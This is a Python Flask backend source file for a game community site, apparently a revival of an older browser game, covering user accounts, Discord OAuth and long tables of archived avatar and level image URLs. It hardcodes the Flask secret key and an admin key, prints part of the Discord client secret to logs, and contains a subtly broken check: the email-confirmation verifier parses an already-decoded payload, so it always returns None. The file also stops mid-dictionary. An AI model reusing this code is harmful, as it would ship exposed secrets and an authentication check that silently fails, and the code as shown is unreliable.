import math
import base64
from datetime import datetime, timedelta, date, timezone
import requests
import os
import re
import json
import html
import secrets
import uuid  # <-- ADDED MISSING IMPORT
from urllib.parse import urlencode
import gzip as _gzip
import time as _time
from dotenv import load_dotenv

load_dotenv(os.path.join(os.path.dirname(os.path.abspath(__file__)), '.env'))
from flask import Flask, render_template, render_template_string, request, jsonify, redirect, url_for, abort, current_app, session, make_response
from flask_sqlalchemy import SQLAlchemy
from flask_login import (
    LoginManager,
    UserMixin,
    login_user,
    logout_user,
    current_user
)
from flask_mail import Mail, Message
from itsdangerous import URLSafeTimedSerializer, SignatureExpired, BadTimeSignature
from sqlalchemy import func, and_, or_, text, Index
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

app = Flask(__name__)

# --- Performance: versioned static bundle URL (cache-busting on deploy) ---
import os as _os
def _app_js_version():
    try:
        return int(_os.path.getmtime(_os.path.join(app.static_folder, 'app.js')))
    except Exception:
        return 1
@app.context_processor
def _inject_app_js_version():
    return {'app_js_version': _app_js_version()}

def _safe_is_child(birthdate):
    # Guard against None / missing / unparseable birthdate so authenticated
    # routes never 500 (a null birthdate previously crashed the profile page).
    if not birthdate:
        return 0
    try:
        _b = date.fromisoformat(birthdate) if isinstance(birthdate, str) else birthdate
        return 1 if (date.today() - _b).days / 365.25 < 13 else 0
    except Exception:
        return 0

app.config['SECRET_KEY'] = 'ewrdjjokl,k,'
admin_key = 'ieror4idled_ejide_3rews'
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USE_SSL'] = False
app.config['MAIL_USERNAME'] = 'smthsmthidksmthsmth@gmail.com@gmail.com'
app.config['MAIL_PASSWORD'] = 'password_here'
app.config['MAIL_DEFAULT_SENDER'] = 'smthsmthidksmthsmth@gmail.com'
mail = Mail(app)

app.url_map.strict_slashes = False

db_path = os.path.join(
    os.path.abspath(os.path.dirname(__file__)),
    'database.db'
)

app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{db_path}'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'home'

limiter = Limiter(
    key_func=get_remote_address,
    app=app,
    default_limits=[],
    storage_uri="memory://"
)

# ==================================================
#  GAME SERVER CONFIGURATION (VPS)
# ==================================================
# Update this to your VPS game server IP:PORT
# Default Photon ports: UDP 5055, TCP 4530, WebSocket 9090, WSS 9091
GAME_SERVER_IP = "15.204.238.118"  # Your VPS IP
GAME_SERVER_UDP_PORT = 5055
GAME_SERVER_TCP_PORT = 4530
GAME_SERVER_WS_PORT = 9090
GAME_SERVER_WSS_PORT = 9091

# Construct full host strings
GAME_SERVER_HOST = f"{GAME_SERVER_IP}:{GAME_SERVER_UDP_PORT}"
GAME_SERVER_WS_HOST = f"{GAME_SERVER_IP}:{GAME_SERVER_WS_PORT}"
GAME_SERVER_WSS_HOST = f"{GAME_SERVER_IP}:{GAME_SERVER_WSS_PORT}"

app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=31)

DISCORD_API_BASE = "https://discord.com/api/v10"
DISCORD_AUTHORIZE_URL = f"{DISCORD_API_BASE}/oauth2/authorize"
DISCORD_TOKEN_URL = f"{DISCORD_API_BASE}/oauth2/token"
DISCORD_USER_URL = f"{DISCORD_API_BASE}/users/@me"
DISCORD_CLIENT_ID = os.environ.get("DISCORD_CLIENT_ID", "1512549899403661515").strip()
DISCORD_CLIENT_SECRET = os.environ.get("DISCORD_CLIENT_SECRET", "").strip()
DISCORD_REDIRECT_URI = os.environ.get("DISCORD_REDIRECT_URI", "").strip()
print(f"[Discord] CLIENT_ID={DISCORD_CLIENT_ID[:8]}... SECRET={'SET (' + DISCORD_CLIENT_SECRET[:8] + '...)' if DISCORD_CLIENT_SECRET else 'EMPTY'}")
DISCORD_BOT_INVITE_URL = os.environ.get(
    "DISCORD_BOT_INVITE_URL",
    "https://discord.com/api/oauth2/authorize?client_id=1512549899403661515&permissions=534723950656&scope=bot+applications.commands"
).strip()
DISCORD_ICON_URL = "https://www.svgrepo.com/show/353655/discord-icon.svg"

VERIFICATION_WEBHOOK_URL = os.environ.get("VERIFICATION_WEBHOOK_URL", "").strip()

def generate_confirmation_token(user_id, new_email):
    serializer = URLSafeTimedSerializer(current_app.config['SECRET_KEY'])
    salt = 'email-update-salt'
    MAX_TARGET_LENGTH = 85

    for pad_length in range(100):
        padding_str = "x" * pad_length
        payload = {
            'user_id': user_id,
            'new_email': new_email,
            'pad': padding_str
        }

        final_token = serializer.dumps(payload, salt=salt)

        # Check if it fits under or exactly hits the character budget
        if len(final_token) <= MAX_TARGET_LENGTH:
            parts = final_token.split('.')
            if len(parts) == 3 and all(parts):
                return final_token

    # Fallback if payload is too large to fit in 85 characters
    return serializer.dumps({'user_id': user_id, 'new_email': new_email}, salt=salt)


def verify_confirmation_token(token, max_age=600):
    serializer = URLSafeTimedSerializer(current_app.config['SECRET_KEY'])
    try:
        payload_string = serializer.loads(token, salt='email-update-salt', max_age=max_age)
        return json.loads(payload_string)
    except (SignatureExpired, BadTimeSignature, Exception):
        return None

class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(150), unique=True, nullable=False)
    email = db.Column(db.String(150), unique=True, nullable=True)
    password = db.Column(db.String(150), nullable=False)
    role = db.Column(db.String(20), default='user', nullable=False)  # 'admin', 'mod', 'staff', 'user'
    gold = db.Column(db.Integer, default=0, nullable=False)
    xp = db.Column(db.Integer, default=0, nullable=False)
    next_level_xp = db.Column(db.Integer, default=0, nullable=False)
    xp_to_next_level = db.Column(db.Integer, default=0, nullable=False)
    previous_level_xp = db.Column(db.Integer, default=0, nullable=False)
    _level = db.Column(db.Integer, default=1, nullable=False)
    friends = db.Column(db.Integer, default=0, nullable=False)
    description = db.Column(db.String(500), default="", nullable=False)
    birthdate = db.Column(db.String(150), default="1970-01-01")
    avatar_id = db.Column(db.Integer, default=17873, nullable=False)
    created = db.Column(db.DateTime, default=datetime.utcnow(), nullable=False)
    email_confirmed = db.Column(db.Integer, default=0, nullable=False)
    language = db.Column(db.String(150), default="en_US", nullable=False)
    notified_of_new_level = db.Column(db.Integer, default=0, nullable=False)
    location = db.Column(db.String(150), nullable=True)
    last_ping = db.Column(db.DateTime(timezone=True), default=datetime.utcnow, nullable=False)
    is_banned = db.Column(db.Boolean, default=False)
    ban_expires = db.Column(db.DateTime, nullable=True)
    ban_reason = db.Column(db.String(255), nullable=True)
    discord_id = db.Column(db.String(64), unique=True, nullable=True)
    discord_username = db.Column(db.String(150), nullable=True)
    discord_avatar_hash = db.Column(db.String(150), nullable=True)
    discord_avatar_url = db.Column(db.String(300), nullable=True)
    discord_verified_at = db.Column(db.DateTime(timezone=True), nullable=True)
    session_version = db.Column(db.Integer, default=1, nullable=False)
    is_elite = db.Column(db.Boolean, default=False, nullable=False)
    two_factor_enabled = db.Column(db.Boolean, default=False, nullable=False)
    locked = db.Column(db.Boolean, default=False, nullable=False)
    suspended = db.Column(db.Boolean, default=False, nullable=False)
    muted_until = db.Column(db.DateTime(timezone=True), nullable=True)
    shadow_banned = db.Column(db.Boolean, default=False, nullable=False)
    warned_count = db.Column(db.Integer, default=0, nullable=False)
    staff_role = db.Column(db.String(30), nullable=True)
    custom_permissions = db.Column(db.Text, nullable=True)
    ip_allowlist = db.Column(db.Text, nullable=True)
    last_login = db.Column(db.DateTime(timezone=True), nullable=True)
    login_ip = db.Column(db.String(64), nullable=True)
    display_name = db.Column(db.String(150), nullable=True)
    admin_notes = db.Column(db.Text, nullable=True)
    LEVEL_XP_MAP = {
        1: 0, 2: 400, 3: 1200, 4: 2400, 5: 4010, 6: 6030, 7: 9060, 8: 12600, 9: 16660, 10: 21240,
        11: 26340, 12: 37460, 13: 49600, 14: 62760, 15: 76950, 16: 92170, 17: 108420, 18: 125700,
        19: 144020, 20: 163380, 21: 183780, 22: 218010, 23: 254530, 24: 293400, 25: 334680,
        26: 378430, 27: 424710, 28: 473580, 29: 525100, 30: 579330, 31: 636330, 32: 1014530,
        33: 1411330, 34: 1827130, 35: 2262330, 36: 2717330, 37: 3192530, 38: 3688330, 39: 4205130,
        40: 4743330, 41: 5303330, 42: 5885530, 43: 6490330, 44: 7118130, 45: 7769330
    }
    AVATAR_IMAGES_MAP = {
        17873: {
            "avatar_name": "Block Boy",
            "micro": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/placeholder/blockboy_micro_18x18.jpg",
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/placeholder/blockboy_small_46x46.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/placeholder/blockboy_medium_64x64.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/placeholder/blockboy_large_330x451.jpg"
        },
        17870: {
            "avatar_name": "Sword Girl",
            "micro": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/bc/1b/bc1bff4c-783c-4fcc-805c-455e7df7e4e4_18x18.png",
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/bc/1b/bc1bff4c-783c-4fcc-805c-455e7df7e4e4_46x46.png",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/bc/1b/bc1bff4c-783c-4fcc-805c-455e7df7e4e4_64x64.png",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/bc/1b/bc1bff4c-783c-4fcc-805c-455e7df7e4e4_330x451.png"
        },
        17868: {
            "avatar_name": "Panda",
            "micro": "https://web.archive.org/web/20250327011714/https://www.kogstatic.com/gen_cache/8b/c7/8bc7e391-d1c1-441a-a331-e12952e022f6_18x18.png",
            "small": "https://web.archive.org/web/20250327011714/https://www.kogstatic.com/gen_cache/8b/c7/8bc7e391-d1c1-441a-a331-e12952e022f6_46x46.png",
            "medium": "https://web.archive.org/web/20250327011714/https://www.kogstatic.com/gen_cache/8b/c7/8bc7e391-d1c1-441a-a331-e12952e022f6_64x64.png",
            "large": "https://web.archive.org/web/20250327011714/https://www.kogstatic.com/gen_cache/8b/c7/8bc7e391-d1c1-441a-a331-e12952e022f6_330x451.png"
        },
        17869: {
            "avatar_name": "Mr. Chang",
            "micro": "https://web.archive.org/web/20250403053341/https://www.kogstatic.com/gen_cache/6d/2c/6d2c29cf-12fd-46a8-a7e6-87802f4e3328_18x18.png",
            "small": "https://web.archive.org/web/20250403053341/https://www.kogstatic.com/gen_cache/6d/2c/6d2c29cf-12fd-46a8-a7e6-87802f4e3328_46x46.png",
            "medium": "https://web.archive.org/web/20250403053341/https://www.kogstatic.com/gen_cache/6d/2c/6d2c29cf-12fd-46a8-a7e6-87802f4e3328_64x64.png",
            "large": "https://web.archive.org/web/20250403053341/https://www.kogstatic.com/gen_cache/6d/2c/6d2c29cf-12fd-46a8-a7e6-87802f4e3328_330x451.png"
        },
        17872: {
            "avatar_name": "Robot",
            "original": "https://web.archive.org/web/20250403053341/https://www.kogstatic.com/gen_images/de/75/de75ccae-be70-4165-b8ea-e831c51f7998.png",
            "micro": "https://web.archive.org/web/20250403053341/https://www.kogstatic.com/gen_cache/de/75/de75ccae-be70-4165-b8ea-e831c51f7998_18x18.png",
            "small": "https://web.archive.org/web/20250403053341/https://www.kogstatic.com/gen_cache/de/75/de75ccae-be70-4165-b8ea-e831c51f7998_46x46.png",
            "medium": "https://web.archive.org/web/20250403053341/https://www.kogstatic.com/gen_cache/de/75/de75ccae-be70-4165-b8ea-e831c51f7998_64x64.png",
            "large": "https://web.archive.org/web/20250403053341/https://www.kogstatic.com/gen_cache/de/75/de75ccae-be70-4165-b8ea-e831c51f7998_330x451.png"
        },
        19743: {
            "avatar_name": "King Of Fire",
            "micro": "https://web.archive.org/web/20250317223121/https://www.kogstatic.com/gen_cache/ef/3c/ef3c2e58-4f4e-4669-b26f-7a3172e62224_18x18.png",
            "small": "https://web.archive.org/web/20250317223121/https://www.kogstatic.com/gen_cache/ef/3c/ef3c2e58-4f4e-4669-b26f-7a3172e62224_46x46.png",
            "medium": "https://web.archive.org/web/20250317223121/https://www.kogstatic.com/gen_cache/ef/3c/ef3c2e58-4f4e-4669-b26f-7a3172e62224_64x64.png",
            "large": "https://web.archive.org/web/20250317223121/https://www.kogstatic.com/gen_cache/ef/3c/ef3c2e58-4f4e-4669-b26f-7a3172e62224_330x451.png"
        }
    }
    LEVEL_IMAGES_MAP = {
        1: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/c7/18/c718e0e08dec452b89609ad7bcf315df_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/c7/18/c718e0e08dec452b89609ad7bcf315df_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/c7/18/c718e0e08dec452b89609ad7bcf315df_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/c7/18/c718e0e08dec452b89609ad7bcf315df.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/c7/18/c718e0e08dec452b89609ad7bcf315df.png"
        },
        2: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/3f/c8/3fc8f961d197458ea3f071d147ad189e_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/3f/c8/3fc8f961d197458ea3f071d147ad189e_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/3f/c8/3fc8f961d197458ea3f071d147ad189e_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/3f/c8/3fc8f961d197458ea3f071d147ad189e.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/3f/c8/3fc8f961d197458ea3f071d147ad189e.png"
        },
        3: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/0c/73/0c73669c8be9471fa25f02dac9d1b617_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/0c/73/0c73669c8be9471fa25f02dac9d1b617_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/0c/73/0c73669c8be9471fa25f02dac9d1b617_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/0c/73/0c73669c8be9471fa25f02dac9d1b617.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/0c/73/0c73669c8be9471fa25f02dac9d1b617.png"
        },
        4: {
            "small": "https://web.archive.org/web/20250307084042/http://www.kogstatic.com/gen_cache/35/11/351123cfe2574618ab50d48aec611cfe_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/http://www.kogstatic.com/gen_cache/35/11/351123cfe2574618ab50d48aec611cfe_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/http://www.kogstatic.com/gen_cache/35/11/351123cfe2574618ab50d48aec611cfe_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/http://www.kogstatic.com/gen_images/35/11/351123cfe2574618ab50d48aec611cfe.png",
            "image_path": "https://web.archive.org/web/20250307084042/http://www.kogstatic.com/gen_images/35/11/351123cfe2574618ab50d48aec611cfe.png"
        },
        5: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/ca/0f/ca0f4264d6bb49e586e0102a9d1c48ab_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/ca/0f/ca0f4264d6bb49e586e0102a9d1c48ab_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/ca/0f/ca0f4264d6bb49e586e0102a9d1c48ab_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/ca/0f/ca0f4264d6bb49e586e0102a9d1c48ab.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/ca/0f/ca0f4264d6bb49e586e0102a9d1c48ab.png"
        },
        6: {
            "small": "https://web.archive.org/web/20250307084042/http://www.kogstatic.com/gen_cache/fc/36/fc366e659e5d454daf347652a135254b_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/http://www.kogstatic.com/gen_cache/fc/36/fc366e659e5d454daf347652a135254b_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/http://www.kogstatic.com/gen_cache/fc/36/fc366e659e5d454daf347652a135254b_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/http://www.kogstatic.com/gen_images/fc/36/fc366e659e5d454daf347652a135254b.png",
            "image_path": "https://web.archive.org/web/20250307084042/http://www.kogstatic.com/gen_images/fc/36/fc366e659e5d454daf347652a135254b.png"
        },
        7: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/d7/5a/d75a410563584aedaa85a5b3f9db0719_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/d7/5a/d75a410563584aedaa85a5b3f9db0719_32x632.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/d7/5a/d75a410563584aedaa85a5b3f9db0719_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/d7/5a/d75a410563584aedaa85a5b3f9db0719.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/d7/5a/d75a410563584aedaa85a5b3f9db0719.png"
        },
        8: {
            "small": "https://web.archive.org/web/20250307084042/http://www.kogstatic.com/gen_cache/9b/2f/9b2f5c1ab33d4349b217d508a129647a_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/http://www.kogstatic.com/gen_cache/9b/2f/9b2f5c1ab33d4349b217d508a129647a_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/http://www.kogstatic.com/gen_cache/9b/2f/9b2f5c1ab33d4349b217d508a129647a_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/http://www.kogstatic.com/gen_images/9b/2f/9b2f5c1ab33d4349b217d508a129647a.png",
            "image_path": "https://web.archive.org/web/20250307084042/http://www.kogstatic.com/gen_images/9b/2f/9b2f5c1ab33d4349b217d508a129647a.png"
        },
        9: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/76/a5/76a5874e7c774ebf945cae1822101789_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/76/a5/76a5874e7c774ebf945cae1822101789_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/76/a5/76a5874e7c774ebf945cae1822101789_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/76/a5/76a5874e7c774ebf945cae1822101789.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/76/a5/76a5874e7c774ebf945cae1822101789.png"
        },
        10: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/02/3a/023a8533df4e4884ab89c71992e8f6db_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/02/3a/023a8533df4e4884ab89c71992e8f6db_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/02/3a/023a8533df4e4884ab89c71992e8f6db_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/02/3a/023a8533df4e4884ab89c71992e8f6db.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/02/3a/023a8533df4e4884ab89c71992e8f6db.png"
        },
        11: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/09/86/09867f9b37a54434a2f7ad48be5cc961_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/09/86/09867f9b37a54434a2f7ad48be5cc961_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/09/86/09867f9b37a54434a2f7ad48be5cc961_64x64",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/09/86/09867f9b37a54434a2f7ad48be5cc961.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/09/86/09867f9b37a54434a2f7ad48be5cc961.png"
        },
        12: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/bb/51/bb51b220d57b49419678cb362edd990c_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/bb/51/bb51b220d57b49419678cb362edd990c_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/bb/51/bb51b220d57b49419678cb362edd990c_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/bb/51/bb51b220d57b49419678cb362edd990c.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/bb/51/bb51b220d57b49419678cb362edd990c.png"
        },
        13: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/ae/f2/aef2376bd5894b3c9a963a55c424137c_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/ae/f2/aef2376bd5894b3c9a963a55c424137c_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/ae/f2/aef2376bd5894b3c9a963a55c424137c_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/ae/f2/aef2376bd5894b3c9a963a55c424137c.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/ae/f2/aef2376bd5894b3c9a963a55c424137c.png"
        },
        14: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/9f/d6/9fd60a8fd0334dcab8883aa66a41ae4f_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/9f/d6/9fd60a8fd0334dcab8883aa66a41ae4f_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/9f/d6/9fd60a8fd0334dcab8883aa66a41ae4f_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/9f/d6/9fd60a8fd0334dcab8883aa66a41ae4f.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/9f/d6/9fd60a8fd0334dcab8883aa66a41ae4f.png"
        },
        15: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/20/bd/20bd2ed2014e45eb928151419769b106_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/20/bd/20bd2ed2014e45eb928151419769b106_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/20/bd/20bd2ed2014e45eb928151419769b106_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/20/bd/20bd2ed2014e45eb928151419769b106.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/20/bd/20bd2ed2014e45eb928151419769b106.png"
        },
        16: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/bc/8b/bc8b3b09b90b4d9bb0d7a139ec3c9f83_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/bc/8b/bc8b3b09b90b4d9bb0d7a139ec3c9f83_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/bc/8b/bc8b3b09b90b4d9bb0d7a139ec3c9f83_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/bc/8b/bc8b3b09b90b4d9bb0d7a139ec3c9f83.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/bc/8b/bc8b3b09b90b4d9bb0d7a139ec3c9f83.png"
        },
        17: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/48/72/487233b0663446a4a8c1094555e9ae1d_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/48/72/487233b0663446a4a8c1094555e9ae1d_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/48/72/487233b0663446a4a8c1094555e9ae1d_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/48/72/487233b0663446a4a8c1094555e9ae1d.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/48/72/487233b0663446a4a8c1094555e9ae1d.png"
        },
        18: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/e3/0d/e30db82e570b4db3a6cdbfd16a09c898_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/e3/0d/e30db82e570b4db3a6cdbfd16a09c898_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/e3/0d/e30db82e570b4db3a6cdbfd16a09c898_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/e3/0d/e30db82e570b4db3a6cdbfd16a09c898.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/e3/0d/e30db82e570b4db3a6cdbfd16a09c898.png"
        },
        19: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/3a/93/3a936b1d98fb43779a622043cf415db0_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/3a/93/3a936b1d98fb43779a622043cf415db0_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/3a/93/3a936b1d98fb43779a622043cf415db0_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/3a/93/3a936b1d98fb43779a622043cf415db0.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/3a/93/3a936b1d98fb43779a622043cf415db0.png"
        },
        20: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/e2/45/e2452eac9ddf46dda28195663d04a1ff_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/e2/45/e2452eac9ddf46dda28195663d04a1ff_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/e2/45/e2452eac9ddf46dda28195663d04a1ff_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/e2/45/e2452eac9ddf46dda28195663d04a1ff.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/e2/45/e2452eac9ddf46dda28195663d04a1ff.png"
        },
        21: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/cf/79/cf7951411b9b4bad9774de7464219b70_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/cf/79/cf7951411b9b4bad9774de7464219b70_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/cf/79/cf7951411b9b4bad9774de7464219b70_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/cf/79/cf7951411b9b4bad9774de7464219b70.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/cf/79/cf7951411b9b4bad9774de7464219b70.png"
        },
        22: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/dd/63/dd63a41f00384cd3b6da8e116fbea0b7_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/dd/63/dd63a41f00384cd3b6da8e116fbea0b7_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/dd/63/dd63a41f00384cd3b6da8e116fbea0b7_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/dd/63/dd63a41f00384cd3b6da8e116fbea0b7.png",
            "image_path": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/dd/63/dd63a41f00384cd3b6da8e116fbea0b7.png"
        },
        23: {
            "small": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/5e/db/5edba0d11a02471689cac1e1e4fc641b_16x16.jpg",
            "medium": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/5e/db/5edba0d11a02471689cac1e1e4fc641b_32x32.jpg",
            "large": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_cache/5e/db/5edba0d11a02471689cac1e1e4fc641b_64x64.jpg",
            "image_path_url": "https://web.archive.org/web/20250307084042/https://www.kogstatic.com/gen_images/5e/db/5edba0d11a02471689cac1e1e4fc641b.png",
